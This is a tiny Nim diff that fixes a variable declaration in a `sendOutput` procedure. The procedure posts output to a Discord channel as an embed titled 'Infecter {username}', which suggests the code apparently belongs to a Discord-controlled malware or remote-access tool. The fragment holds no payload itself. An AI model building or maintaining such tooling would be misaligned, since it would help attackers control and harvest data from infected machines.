@@ -8,7 +8,7 @@ type Sender* = object
     channelId: string
 
 proc sendOutput*(self: Sender, api: RestApi, channelId: string , output: string, format: bool = true): Future[Message] {.async.} =
-    embeds = seq[Embed]
+    var embeds: seq[Embed]
     if format:
         embeds = @[Embed(
                     title: some &"Infecter {username}",
